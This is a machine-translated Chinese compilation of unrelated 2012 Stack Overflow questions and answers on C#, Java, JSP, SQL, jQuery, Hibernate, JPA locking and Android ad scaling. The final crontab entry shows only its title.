> 赞同：1
> 
> 时间：2012-05-25T15:32:03.463
> 
> 标签：charts, telerik, radchart, uiappearance

我正在尝试自定义系列具有的 ASP Web 表单 RadChart 的外观，`FillType = Solid`同时仍然允许在较大的点值后面看到较小的点值。我真正想要的是每个系列都在所有填充顶部放置一个轮廓（基本上是在 a`ChartSeriesType.Line`顶部放置的效果`ChartSeriesType.Area`）。

我已经尝试过设置`LineAppearance.Shadow`、颜色透明度以及它们的组合，但仍然很难辨别背景系列值。

使用实心填充时是否没有一种简单的方法可以为每个系列打开轮廓？或者只设置背景填充的透明度，而不是边缘？

![在此处输入图像描述](../Images/fb5097a5bb69c40c404ebc7420d44466.png)

注意上图中的透明度。恐怕允许更高的透明度会提高背景值的可见性，但会导致可怕的柔和颜色集合。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-31T06:07:11.937

我建议您浏览`telerik`文档页面[RadControls for ASP.NET AJAX Documentation -Styling Chart Elements](http://www.telerik.com/help/aspnet-ajax/chart-styling-elements.html)和这个很好的示例[以编程方式创建 RadChart - 更复杂的示例](http://www.telerik.com/help/aspnet-ajax/chart-building-programmatic-create-complex.html)。

代码片段：

```
// Define chart and titleRadChart radChart = new RadChart();
radChart.ChartTitle.TextBlock.Text = "My RadChart";
radChart.ChartTitle.TextBlock.Appearance.TextProperties.Color = System.Drawing.Color.Blue;
// Define chart series
ChartSeries chartSeries = new ChartSeries();
chartSeries.Appearance.LabelAppearance.Visible = false;
chartSeries.Name = "GDP";
chartSeries.Type = ChartSeriesType.Line;
chartSeries.Appearance.LineSeriesAppearance.Color = System.Drawing.Color.BlueViolet;
// Define the items in the series
chartSeries.AddItem(1);
chartSeries.AddItem(1.5);
chartSeries.AddItem(2.0);
chartSeries.AddItem(2.5);
chartSeries.AddItem(3.5);
// visually enhance the datapoints
chartSeries.Appearance.PointMark.Dimensions.AutoSize = false;
chartSeries.Appearance.PointMark.Dimensions.Width = 5;
chartSeries.Appearance.PointMark.Dimensions.Height = 5;
chartSeries.Appearance.PointMark.FillStyle.MainColor = System.Drawing.Color.Black;
chartSeries.Appearance.PointMark.Visible = true;
// Define chart series
ChartSeries chartSeries2 = new ChartSeries();
chartSeries2.Appearance.LabelAppearance.Visible = false;
chartSeries2.Name = "GNP";
chartSeries2.Type = ChartSeriesType.Line;
chartSeries2.Appearance.LineSeriesAppearance.Color = System.Drawing.Color.Green;
// Define the items in the series
chartSeries2.AddItem(2);
chartSeries2.AddItem(3);
chartSeries2.AddItem(3.5);
chartSeries2.AddItem(4);
chartSeries2.AddItem(4.5);
// visually enhance the data points
chartSeries2.Appearance.PointMark.Dimensions.AutoSize = false;
chartSeries2.Appearance.PointMark.Dimensions.Width = 5;
chartSeries2.Appearance.PointMark.Dimensions.Height = 5;
chartSeries2.Appearance.PointMark.FillStyle.MainColor = System.Drawing.Color.Black;
chartSeries2.Appearance.PointMark.Visible = true;
// set the plot area gradient background fill
radChart.PlotArea.Appearance.FillStyle.FillType = Telerik.Charting.Styles.FillType.Gradient;
radChart.PlotArea.Appearance.FillStyle.MainColor = System.Drawing.Color.FromArgb(65, 201, 254);
radChart.PlotArea.Appearance.FillStyle.SecondColor = System.Drawing.Color.FromArgb(0, 107, 186);
// Set text and line for X axis
radChart.PlotArea.XAxis.AxisLabel.TextBlock.Text = "Years";
radChart.PlotArea.XAxis.AxisLabel.TextBlock.Appearance.TextProperties.Color = System.Drawing.Color.Red;
radChart.PlotArea.XAxis.Appearance.Width = 3;
radChart.PlotArea.XAxis.Appearance.Color = System.Drawing.Color.Red;
// Set text and line for Y axis
radChart.PlotArea.YAxis.AxisLabel.TextBlock.Text = "%";
radChart.PlotArea.YAxis.AxisLabel.TextBlock.Appearance.TextProperties.Color = System.Drawing.Color.Red;
radChart.PlotArea.YAxis.Appearance.Width = 3;
radChart.PlotArea.YAxis.Appearance.Color = System.Drawing.Color.Red;
// Add the series to the chart, chart to page.radChart.Series.Add(chartSeries);radChart.Series.Add(chartSeries2);this.Page.Controls.Add(radChart) 
```

希望这有帮助..

# c# - 正则表达式数据注释不允许开始/结束空格（类似于修剪）

> ID：10757255
> 
> 赞同：3
> 
> 时间：2012-05-25T15:32:07.447
> 
> 标签：c#, regex, asp.net-mvc, data-annotations

我正在使用正则表达式数据注释来验证街道地址字段是否包含数字、字母和空格（介于两者之间）。如果街道字段在用户输入的文本的开头或结尾包含空格，我希望数据注释引发错误。

**例子：**

```
// [123 Fake Street] = valid
// [   123 Fake Street] = not valid
// [   123 Fake Street    ] = not valid
// [123 Fake Street   ] = not valid 
```

这是我到目前为止所拥有的：

```
[RegularExpression(@"^[a-zA-Z 0-9]+$", ErrorMessage = "Street Address not valid.")] 
```

任何帮助，将不胜感激。

谢谢

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-25T15:44:40.937

你只需要改变一点：

```
"^(?:[a-zA-Z0-9]+\s?)+[a-zA-Z0-9]+$" 
```

这表示：

1.  获取 1 个或多个字母或数字以及一个可选空格并重复 1 次或多次；
2.  以一个或多个字母或数字结尾

你也可以写：

```
"^(?:\w+\s?)+\w+$" 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-25T15:37:14.217

不确定这是否是一项学术练习，但您可以从用户输入中删除前导和尾随空格吗？似乎这只是格式问题，而不是合法错误。但如果目标是更好地理解 RegEx，请忽略我的胡言乱语。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-25T16:17:12.353

如果您正在寻找的只是缺少空格，那么您可以这样做：

```
^\S.+\S$ 
```

这确保它以数字开头，以字母、句点或数字结尾。

这基本上相当于：

```
^[^ ].+[^ ]$ 
```

您也可以只查找以数字开头并以字符或句点结尾的内容（用于缩写）

```
^\d.*[\w\.]$ 
```

# jsp - jsp：包含位置问题

> ID：10757258
> 
> 赞同：1
> 
> 时间：2012-05-25T15:32:26.747
> 
> 标签：jsp, include

我对 jsp 动态包含有疑问。换句话说，我有一个用于模板的主jsp，它包括另外两个jsp。包含的jsp包含SAP hbj taglibrary，主JSP是纯JSP（1.2）代码。

问题是包含的 JSP 在运行时不尊重呈现顺序，但它们呈现在页面顶部。我读了一些关于这个的帖子，但我没有找到解决方案。

请你帮帮我好吗？

谢谢

```
 // Primo CASO:
// Compiling Exception:
// •    No renderer context available (a htmlb tag without a rendererContext attribute must be nested within a RendererContext tag)

// masterPage.jsp
<%@ taglib uri="tagLib" prefix="hbj" %>
<jsp:useBean id="myBean" scope="session" class="include.test.bean.MyBean" />
<hbj:content id="myContext" >
  <hbj:page title="PageTitle">
   <hbj:form id="myFormId" >

        <div>
        <p>IncludedPage1 Start</p>
            <jsp:include page="includedPage1.jsp" />
        <p>IncludedPage1 End</p>

        <p>IncludedPage2 Start</p>
            <jsp:include page="includedPage2.jsp" />
        <p>IncludedPage2 End</p>

        <p>IncludedPage3 Start</p>
            <jsp:include page="includedPage3.jsp" />
        <p>IncludedPage3 End</p>

        </div>

        <div>
            <h3><%="MyBean: " + myBean.toString()%></h3>
        </div>

   </hbj:form>
  </hbj:page>
</hbj:content>

//includedPage1.jsp
<%@ taglib uri="tagLib" prefix="hbj" %>
<jsp:useBean id="myBean" scope="session" class="include.test.bean.MyBean" />

<div class="radioCheck_elementContainer">
    <hbj:radioButtonGroup id="fldUteRegistrato" columnCount="2" selection="<%=myBean.getRadioButtonValue()%>">  
        <%fldUteRegistrato.setOnClick("onClickRadio");%>
        <hbj:radioButton id="fldUteRegistratoSI" text="SI" key="SI" tooltip="Registrato" disabled="FALSE" />
        <hbj:radioButton id="fldUteRegistratoNO" text="NO, procedere alla registrazione sul sito Poste.it da parte del Cointestatario" key="NO" tooltip="Non Registrato" disabled="FALSE" />
        <hbj:radioButton id="fldUteRegistratoNULL" text="NULL VALUE" key="NULL" tooltip="NULL VALUE" disabled="FALSE" />
    </hbj:radioButtonGroup>             
</div>

//includedPage2.jsp
<%@ taglib uri="tagLib" prefix="hbj" %>
<jsp:useBean id="myBean" scope="session" class="include.test.bean.MyBean" />

<% String ifldId = ""; %>
<hbj:inputField id="fldInputFieldPage2" type="string" maxlength="16" value="">
    <% ifldId = myContext.getParamIdForComponent(fldInputFieldPage2); %>
</hbj:inputField>

<script type="text/javascript">
    alert("ID CAMPO:" + <%=ifldId%>)
</script>

//includedPage3.jsp
<%@ taglib uri="tagLib" prefix="hbj" %>
<jsp:useBean id="myBean" scope="session" class="include.test.bean.MyBean" />

<hbj:inputField id="fldInputField" type="string" maxlength="16" value="" />

<% String avanti="";%>
<hbj:button id="cmdAvanti" text="Avanti" width="127" onClick="onCmdAvanti" design="EMPHASIZED" encode="True">
<%
    avanti = myContext.getParamIdForComponent(cmdAvanti);
%>
</hbj:button>

<script type="text/javascript">
    alert("ID Pulsante:" + <%=avanti%>)
</script>

// Secondo CASO:

// Exception:
// •    Nessuna
// Comportamento:
// •    Solo I campi appartenenti al form da cui parte l’evento vengono inviati al server, la causa è la creazione di più form e quindi di conseguenza nell’HTTP request trovo solo i campi del form da cui è staqto effettuato il submit (Evento)

// masterPage.jsp
<%@ taglib uri="tagLib" prefix="hbj" %>
<jsp:useBean id="myBean" scope="session" class="include.test.bean.MyBean" />

        <div>
        <p>IncludedPage1 Start</p>
            <jsp:include page="includedPage1.jsp"  flush="true" />
        <p>IncludedPage1 End</p>

        <p>IncludedPage2 Start</p>
            <jsp:include page="includedPage2.jsp"  flush="true" />
        <p>IncludedPage2 End</p>

        <p>IncludedPage3 Start</p>
            <jsp:include page="includedPage3.jsp"  flush="true" />
        <p>IncludedPage3 End</p>

        </div>

        <div>
            <h3><%="MyBean: " + myBean.toString()%></h3>
        </div>

//includedPage1.jsp
<%@ taglib uri="tagLib" prefix="hbj" %>
<jsp:useBean id="myBean" scope="session" class="include.test.bean.MyBean" />

<hbj:content id="myContext1" >
  <hbj:page title="PageTitle1">
        <hbj:form id="myFormId" >
        <div class="radioCheck_elementContainer">
            <hbj:radioButtonGroup id="fldUteRegistrato" columnCount="2" selection="<%=myBean.getRadioButtonValue()%>">  
                <%fldUteRegistrato.setOnClick("onClickRadio");%>
                <hbj:radioButton id="fldUteRegistratoSI" text="SI" key="SI" tooltip="Registrato" disabled="FALSE" />
                <hbj:radioButton id="fldUteRegistratoNO" text="NO, procedere alla registrazione sul sito Poste.it da parte del Cointestatario" key="NO" tooltip="Non Registrato" disabled="FALSE" />
                <hbj:radioButton id="fldUteRegistratoNULL" text="NULL VALUE" key="NULL" tooltip="NULL VALUE" disabled="FALSE" />
            </hbj:radioButtonGroup>             
        </div>
        </hbj:form>
    </hbj:page>
</hbj:content>
includedPage2.jsp
<%@ taglib uri="tagLib" prefix="hbj" %>
<jsp:useBean id="myBean" scope="session" class="include.test.bean.MyBean" />

<hbj:content id="myContext2" >
  <hbj:page title="PageTitle2">
        <hbj:form id="myFormId" >
        <% String ifldId = ""; %>
        <hbj:inputField id="fldInputFieldPage2" type="string" maxlength="16" value="<%=myBean.getInputFieldValuePage2()%>">
            <% ifldId = myContext2.getParamIdForComponent(fldInputFieldPage2); %>
        </hbj:inputField>

        <script type="text/javascript">
            alert("ID CAMPO:" + <%=ifldId%>)
        </script>

        </hbj:form>
    </hbj:page>
</hbj:content>

//includedPage3.jsp
<%@ taglib uri="tagLib" prefix="hbj" %>
<jsp:useBean id="myBean" scope="session" class="include.test.bean.MyBean" />

<hbj:content id="myContext3" >
  <hbj:page title="PageTitle3">
        <hbj:form id="myFormId" >
            <hbj:inputField id="fldInputField" type="string" maxlength="16" value="<%=myBean.getInputFieldValue()%>" />

            <% String avanti="";%>
            <hbj:button id="cmdAvanti" text="Avanti" width="127" onClick="onCmdAvanti" design="EMPHASIZED" encode="True">
            <%
                avanti = myContext3.getParamIdForComponent(cmdAvanti);
            %>
            </hbj:button>

            <script type="text/javascript">
                alert("ID Pulsante:" + <%=avanti%>)
            </script>
        </hbj:form>
    </hbj:page>
</hbj:content>
<script type="text/javascript">
    alert("ID Pulsante:" + <%=avanti%>)
</script>

// Appendice:

// MasterPage.java
package include.test;

import include.test.bean.MyBean;
import com.sapportals.htmlb.*;
import com.sapportals.htmlb.enum.*;
import com.sapportals.htmlb.event.*;
import com.sapportals.htmlb.page.*;
import com.sapportals.portal.htmlb.page.*;
import com.sapportals.portal.prt.component.*;

public class MasterPage extends PageProcessorComponent {

    public DynPage getPage() {
        return new MasterPageDynPage();
    }

    public static class MasterPageDynPage extends JSPDynPage {

        private MyBean myBean = null;

        private void initBean() {
            IPortalComponentSession componentSession =
                ((IPortalComponentRequest) getRequest()).getComponentSession();
            Object o = componentSession.getValue("myBean");
            if (o == null || !(o instanceof MyBean)) {
                myBean = new MyBean();
                componentSession.putValue("myBean", myBean);
            } else {
                myBean = (MyBean) o;
            }

        }

        public void doInitialization() {
            IPortalComponentSession componentSession =
                ((IPortalComponentRequest) getRequest()).getComponentSession();
            Object o = componentSession.getValue("myBean");
            if (o == null || !(o instanceof MyBean)) {
                myBean = new MyBean();
                componentSession.putValue("myBean", myBean);

            } else {
                myBean = (MyBean) o;
            }
            myBean.setMethod("doInitialization");
        }

        public void doProcessAfterInput() throws PageException {
            initBean();
            InputField ifld = (InputField) getComponentByName("fldInputField");

            if(ifld!=null && ifld.getValue()!=null) {
                myBean.setInputFieldValue(ifld.getValue().toString());
            }
            else {
                myBean.setInputFieldValue("NULL VALUE");
            }

            RadioButtonGroup radioButtonGroup = (RadioButtonGroup) getComponentByName("fldUteRegistrato");

            if(radioButtonGroup!=null && radioButtonGroup.getSelection()!=null) {
                myBean.setRadioButtonValue(radioButtonGroup.getSelection());
            }
            else {
                myBean.setRadioButtonValue("NULL");
            }

            InputField ifld2 = (InputField) getComponentByName("fldInputFieldPage2");

            if(ifld2!=null && ifld2.getValue()!=null) {
                myBean.setInputFieldValuePage2(ifld2.getValue().toString());
            }
            else {
                myBean.setInputFieldValuePage2("NULL VALUE");
            }

            myBean.setMethod("doProcessAfterInput");
        }

        public void doProcessBeforeOutput() throws PageException {
            this.setJspName("masterPage.jsp");
        }

        public void onClickRadio(Event event) {
            initBean();
            myBean.setEvent("onClickRadio");
        }

        public void onCmdAvanti(Event event) {
            initBean();
            myBean.setEvent("onCmdAvanti");
        }
    }
}

//MyBean.java
package include.test.bean;

import java.io.Serializable;

public class MyBean implements Serializable {
    private String event = "";
    private String inputFieldValue = "";
    private String inputFieldValuePage2 = "";
    private String radioButtonValue= "";
    private String method = "";

    public String getEvent() {
        return event;
    }
    public void setEvent(String e) {
        event = e;
    }

    /**
     * @return
     */
    public String getInputFieldValue() {
        return inputFieldValue;
    }

    /**
     * @param string
     */
    public void setInputFieldValue(String string) {
        inputFieldValue = string;
    }

    /**
     * @return
     */
    public String getRadioButtonValue() {
        return radioButtonValue;
    }

    /**
     * @param string
     */
    public void setRadioButtonValue(String string) {
        radioButtonValue = string;
    }

    /**
     * @return
     */
    public String getInputFieldValuePage2() {
        return inputFieldValuePage2;
    }

    /**
     * @param string
     */
    public void setInputFieldValuePage2(String string) {
        inputFieldValuePage2 = string;
    }

    /* (non-Javadoc)
     * @see java.lang.Object#toString()
     */
    public String toString() {
        return "MyBean [method=" + method + ", event=" 
+ event + ", inputFieldValue=" + inputFieldValue 
+ ", inputFieldValuePage2=" + inputFieldValuePage2
            + ", radioButtonValue=" + radioButtonValue + "]";
    }
    /**
     * @return
     */
    public String getMethod() {
        return method;
    }

    /**
     * @param string
     */
    public void setMethod(String string) {
        method = string;
    }

} 
```

# sql - 死锁，与数据库的连接被丢弃

> ID：10757259
> 
> 赞同：0
> 
> 时间：2012-05-25T15:32:32.127
> 
> 标签：sql, sql-server

我有一个连接到 SQL 服务器以运行一些插入/更新的应用程序。我们遇到了死锁，但我注意到除了报告死锁之外，与数据库的连接被断开，客户端必须重新连接。

这是正常的吗？即使这不是正常行为，SQL 服务器是否可能不仅决定我的客户端将成为死锁受害者，而且还终止连接？

有没有办法阻止连接被丢弃？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-25T15:39:52.247

根据定义，死锁意味着两个连接被卡住，其中 SPID 1 锁定了 SPID 2 需要的东西，而 SPID 2 锁定了 SPID 1 需要的东西。双方都无法完成交易，因为他们需要对方锁定的东西。在这种情况下，服务器将选择一个受害者 SPID 并杀死它，以便另一个可以完成其事务。

阻止它的唯一方法是首先弄清楚为什么会发生死锁。您可以运行跟踪以监控死锁并将与死锁相关的信息捕获到图表中，然后在 SSMS 中查看图表。

此处提供更多信息：[http ://www.simple-talk.com/sql/learn-sql-server/how-to-track-down-deadlocks-using-sql-server-2005-profiler/](http://www.simple-talk.com/sql/learn-sql-server/how-to-track-down-deadlocks-using-sql-server-2005-profiler/)

# java - 尝试为休眠中的属性指定默认值

> ID：10757260
> 
> 赞同：0
> 
> 时间：2012-05-25T15:32:41.997
> 
> 标签：java, hibernate

尝试将行插入表时，我从休眠中收到以下错误消息：

> org.hibernate.exception.ConstraintViolationException：列“优先级”不能为空

我知道我可以在代码中添加一行来设置值，但是在许多其他情况下程序依赖于数据库中的默认值（db 是 mysql）。

我在某处读到，您可以在 hbm.xml 文件中提供默认值，但 hibernate 无法识别它。这是 JobQueue.hbm.xml 中的相应部分

```
 <property name="priority" type="integer">
        <column name="priority" default="0" />
    </property> 
```

我想另一个选择是修改生成的 JobQueue.java 文件（我正在使用 eclipse hibernate 工具来自动生成休眠类）但是现在我想尝试让 hbm.xml 配置工作。

我正在使用 4.1.3 版的休眠库和 Eclipse 休眠工具 3.4.0.x。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-29T10:15:06.233

`default="0"`仅与生成数据库模式的 SchemaExport 相关。除了休眠完全忽略此设置。您可以尝试`not-null="true"`为该列设置。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-05-02T21:21:46.367

除非您无法重新创建整个数据库模式，否则您可以在变量初始化中设置默认值。在您的模型中，在初始化中将优先级设置为 0。

在你的课堂上：

```
private Integer priority = 0; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-04T20:11:21.047

我最终修改了 JobQueue.java POJO 以设置默认值。为了确保休眠工具的代码生成不会覆盖此更改，我对其进行了设置，以便代码生成在临时文件夹中生成文件，然后将必要的文件复制到永久源位置。

# c++ - 强制链接静态库中的 cpp 文件（Visual Studio）

> ID：10757262
> 
> 赞同：1
> 
> 时间：2012-05-25T15:32:49.040
> 
> 标签：c++, visual-studio-2008, static, linker, xll

我有一堆包含静态变量的 cpp 文件（应该没有头文件）。我的 Visual Studio 2008 编译器似乎忽略了这些静态变量 - 我该如何解决？

更多细节：

*   我有一个具有静态字段 allInstances 的抽象类；当构造我的类的“具体”实例时（它发生在实例化 cpp 文件中的静态变量时），指向它的指针被 push_back'ed 到 allInstances 中。
*   Cpp 文件包含从我的抽象类派生的类；它们的实现需要保留在 cpp 文件中，因为它们只能通过 allInstances 调用
*   我的抽象类 cpp 文件位于在静态库中编译的文件夹（项目）中
*   此静态库由编译 xll 的项目使用

当 cpp 文件位于 xll 项目中时，一切都很好。但是当我将 cpp 文件移动到一个单独的文件夹中时（需要这样做，因为 excel 现在不是唯一的界面）我的静态变量不再被实例化。

我有很多这些 cpp 文件，并将它们全部包含在每个 xll、exe、pyd、dll 等项目中。

有任何想法吗？提前谢谢了。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-25T15:50:59.590

您必须告诉链接器相应的目标文件是程序的一部分。通常，这是通过将它们指定为目标文件来完成的，而不是将它们放入库中；根据定义，库中的目标文件只有在解析外部引用时才会成为程序的一部分。

# jquery - jquery modal 对话框不适用于 modal:true

> ID：10757265
> 
> 赞同：1
> 
> 时间：2012-05-25T15:32:52.837
> 
> 标签：jquery

不知道我在这里做错了什么。只是试图使它成为一个模态对话框（使页面内容变暗）。我以为它很简单`modal:true`。当我单击图像时会出现一个对话框，但它不会使页面内容变暗。

```
<img src="images/help-35-30.png" alt="Help" class="helpdetails" style="padding-left:30px;"/>
<div class="dialogplease"><p>A comment</p></div>

<link rel="stylesheet" type="text/css" href="mycss/css/jquery-ui-1.8.20.custom.css" />
<script language="javascript" type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
<script language="javascript" type="text/javascript" src="http://ajax.aspnetcdn.com/ajax/jquery.ui/1.8.20/jquery-ui.js"></script>       
<script>
$(function() {

$('.dialogplease').dialog(); //init dialog
$('.dialogplease').dialog('close'); //don't show dialog yet
$('.helpdetails').click(function(e) {
    $('.dialogplease').dialog('open')({
    modal: true
    });
});
});
</script> 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-25T15:36:32.437

语法错误。

您应该最初设置它：

```
$(function() {    
    $('.dialogplease').dialog({modal:true,autoOpen:false}); //init dialog
    $('.helpdetails').click(function(e) {
        $('.dialogplease').dialog('open');
    });
}); 
```

# c# - 自定义 GridViewTextBoxColumn 以允许我在单元格编辑时有一个按钮

> ID：10757267
> 
> 赞同：1
> 
> 时间：2012-05-25T15:33:00.440
> 
> 标签：c#, winforms, telerik

我创建了一个自定义 GridViewTextBoxColumn 来处理以下内容：

1）当不在 EditMode （问题区域）时显示为 Normal TextboxColumn 1）在编辑模式下，我将 AutoComplete 添加到 Cell 以提示用户输入项目列表 2）单击我放置在左侧的椭圆按钮要浏览的文本框（打开一个带有更多列的项目网格的表单）

我已经添加了所有没有问题，甚至可以在单元格上动态添加 BeginEdit 中的 AutoComplte 源（或者我可以在 AutoCompleteTextBoxCellElement 的 CreateChildElements 方法中添加它）

所以会发生以下情况：

我的课是这样的：

```
public class AutoCompleteTextBoxCell : GridDataCellElement      
{
    public AutoCompleteTextBoxCell(GridViewColumn column, GridRowElement row)
        : base(column, row)
    {

    }
} 
```

然后我添加这个方法来添加元素，文本框

```
protected override void CreateChildElements()
    {
        txtStockCode = new RadTextBoxElement();
        this.Children.Add(txtStockCode);
        LoadData("Code"); //Adding Auto Complete in this event
    } 
```

我还添加了这个，以便我可以排列单元格中的元素。

```
protected override SizeF ArrangeOverride(SizeF finalSize)
    {
        RectangleF rect = GetClientRectangle(finalSize);
        RectangleF rectEdit = new RectangleF(rect.X, rect.Y, rect.Width - (32 + 1), rect.Height);
        RectangleF rectButton = new RectangleF(rectEdit.Right + 1, rectEdit.Y, 32, rect.Height);
        if (this.Children.Count >= 2)
        {
            this.Children[0].Arrange(rectEdit);
            this.Children[1].Arrange(rectButton);
        }
        else
        {
            rectEdit = new RectangleF(rect.X, rect.Y, rect.Width, rect.Height);
            this.Children[0].Arrange(rectEdit);
        }

        return finalSize;
    } 
```

然后回到网格上，我执行以下操作：

```
enter code here 
```

私人无效grdMain_CellBeginEdit（对象发件人，GridViewCellCancelEventArgs e）{如果（e.Column.Name ==“colItem”）{

```
 RadButtonElement btnMore = new RadButtonElement();
            btnMore.Text = "...";
            btnMore.Click += new EventHandler(btnMore_Click);
            grdMain.CurrentCell.Children.Add(btnMore);
        }
    } 
```

这会添加我的按钮，以便我可以在单元格的编辑模式下启动浏览表单。

在 EndEdit 事件中，我删除了按钮。

```
private void grdMain_CellEndEdit(object sender, GridViewCellEventArgs e)
    {
        if (e.Column.Name == "colStock")
        {
            if (this.grdMain.CurrentCell.Children.Count <= 2) //This might be 1 or 2
            {
                if (grdMain.CurrentCell.Children.Count == 2) // If its two, I need to remove the button
                {
                    if (grdMain.CurrentCell.Children[1] is RadButtonElement)
                    {
                        this.grdMain.CurrentCell.Children.RemoveAt(1);
                    }
                    //If one, I do nothing for the moment. -- I think.
                }
            }  
        }
    } 
```

一切都好接受一个问题。

添加单元格后，我假设它会返回到像普通文本框列一样的行为（由于我的继承），但事实并非如此，文本被隐藏 - 我看不到它。

当我单击单元格进入编辑模式时，我输入的文本就在那里。

我确实认为这是我要实现的目标的问题，我认为这是事件链的问题。

谁能告诉我为什么当单元格不处于编辑模式时文本没有显示？

问候约翰

# mysql - 同时更新实体依赖实体属性

> ID：10757270
> 
> 赞同：0
> 
> 时间：2012-05-25T15:33:09.583
> 
> 标签：mysql, jpa

我创建了一个实体用户，它具有整数属性交易配额。我需要根据其价值更新交易配额。

如果大于 0，则需要递减，否则需要保留其值。

所以这是我的算法。

1.  从数据库中检索用户实体。
2.  检查事务配额，如果事务配额大于0，则减一。
3.  保留更改的用户实体。

在上述情况下，当并发请求出现时，如果两个线程检索相同的用户实体，然后两个线程都读取相同的事务配额值，如果它大于 0，则都减 1 并更新用户实体。

前任。

```
ThreadA: val = e.getTxnQuota(); val = 5
ThreadB: val = e.getTxnQuota(); val = 5
ThreadA: e.setTxnQuota(val- 1); val = 4 
ThreadB: e.setTxnQuota(val- 1); val =4
ThreadA: eDao.save(e);
ThreadB: eDao.save(e); 
```

在上述情况下，保存的值是 4 而不是 3。

那么有什么方法可以创建一个原子事务，我可以在其中检查事务配额并更新用户实体？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-25T17:17:01.080

这称为*锁定*，通常最好使用*乐观*锁定。JPA 附带了一个标准机制来执行此操作。只需向您的实体添加一个版本字段，并使用@Version 对其进行注释：

```
@Version
private long version; 
```

瞧！

每次保存用户时，其当前版本将与数据库中的版本进行比较，并递增：

```
update user set ..., version = version + 1 where id = ... and version = theVersionOfTheUserWhenItWasLoaded 
```

（这一切都是透明地发生的）。

如果版本不匹配，则不会更新任何内容，JPA 引擎会检测到它，抛出 OptimisticLockException，并将事务标记为回滚。

旁注：在上面的场景中，调用`save()`是不必要的：对附加实体所做的所有更改都会自动保存在数据库中。无需保存实体。

# android - 如何在 Android 中缩小视图（特别是广告）

> ID：10757273
> 
> 赞同：0
> 
> 时间：2012-05-25T15:33:19.767
> 
> 标签：android, admob

我正在与几个不同的广告网络合作，它们在大多数设备上都可以正常工作，但在屏幕密度高的设备上，它们会尝试提供帮助并扩大规模。但这与我所需要的几乎相反。

我的布局非常适合不同的屏幕尺寸，当我从几个不同的广告网络请求具有特定*像素尺寸*的广告时，它们会根据屏幕密度进行缩放。我的问题是这样的：

如何将视图缩小到我要求的*像素大小？*如果有帮助的话，我遇到问题的广告网络包括 JumpTap、AdMob，以及在较小程度上的千禧媒体。

# c# - 在数据库中更新会引发 SqlException

> ID：10757280
> 
> 赞同：1
> 
> 时间：2012-05-25T15:33:43.040
> 
> 标签：c#, sql-server

这是我的 SQL 语句：

```
UPDATE InboxItem 
SET OrderId = @0, Item = @1, Quantity = @2, Price = @3, 
    Memo = "", InboxId = @4, VATId = @5 
WHERE Id = @6 
```

这抛出`SqlException`，说

> 缺少对象或列名称或为空。对于 SELECT INTO 语句，验证每一列都有一个名称。对于其他语句，请查找空别名。不允许使用定义为 \"\" 或 [] 的别名。将别名更改为有效名称。

我想我知道问题是什么。如果我赋予备忘录价值，一切都很好。但是，我有时希望备忘录是空字符串。这该怎么做？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-25T15:36:24.403

使用`''`而不是`""`. 还要验证您的输入是否正确转义（可能其中一个字符串中有一个未转义的逗号）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-25T16:03:11.893

```
var sb = new StringBuilder();            
sb.Append("UPDATE InboxItem ");
sb.Append("SET OrderId = @0, Item = @1, Quantity = @2, Price = @3, ");
sb.Append("Memo = @7, InboxId = @4, VATId = @5 ");
sb.Append("WHERE Id = @6");
var cm = new SqlCommand(sb.ToString());
cm.CommandType = System.Data.CommandType.Text;
cm.Parameters.AddWithValue("@1", Convert.ToInt16("OrderValue"));
//and so on 
```

# java - AtomicInteger 公平吗？

> ID：10757284
> 
> 赞同：3
> 
> 时间：2012-05-25T15:33:45.543
> 
> 标签：java, integer, atomic

[AtomicInteger](http://docs.oracle.com/javase/6/docs/api/java/util/concurrent/atomic/AtomicInteger.html)是否提供任何形式的公平保证？像先到先服务的线程执行顺序就可以了？[Victor Grazi 的同步动画](http://sourceforge.net/projects/javaconcurrenta/)中的动画示例绝对没有表现出任何这样的公平性。我已经搜索并没有找到任何结论性的东西。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-25T15:36:36.477

不，没有这样的保证。如果有的话，会在文档中详细说明。

当您考虑它时，`AtomicInteger`它基本上是[比较和交换](http://en.wikipedia.org/wiki/Compare-and-swap)（或类似）的薄包装。保证先到先服务的语义将需要线程之间的同步，这是昂贵的，并且与`AtomicInteger`.

事情的方式是，如果有多个线程想要`incrementAndGet()`同时处理相同的原子整数，那么它们完成比赛的顺序是未指定的。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-25T15:58:11.460

与您可能做的任何其他事情相比，它的操作速度非常快，这毫无价值。这意味着您极不可能发生争用，因此公平性不太可能成为问题。

如果你调用它 20 亿次（你可以在几秒钟内完成），它无论如何都会溢出。如果这是一个问题，我会使用 AtomicLong。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-25T15:46:55.293

如果您查看来源，您将得到正确的答案，即关于订购保证的**“是”**和“**否”。****这取决于调用的方法。**有些支持订购保证，有些不支持。

以下源代码显示它支持两种模式，具体取决于调用的方法。

```
 138       /**
  139        * Atomically sets the value to the given updated value
  140        * if the current value {@code ==} the expected value.
  141        *
  142        * <p>May <a href="package-summary.html#Spurious">fail spuriously</a>
  143        * and does not provide ordering guarantees, so is only rarely an
  144        * appropriate alternative to {@code compareAndSet}.
  145        *
  146        * @param expect the expected value
  147        * @param update the new value
  148        * @return true if successful.
  149        */
  150       public final boolean weakCompareAndSet(int expect, int update) {
  151           return unsafe.compareAndSwapInt(this, valueOffset, expect, update);
  152       } 
```

如果有疑问，请阅读 JavaDoc，如果仍然不清楚，请阅读源代码。

# linux - 在 crontab 中调度 shell 脚本

> ID：10757288
> 
> 赞同：1
> 
> 时间：2012-05-25T15:33:52.703
> 
> 标签：linux, shell, cron, debian, crontab

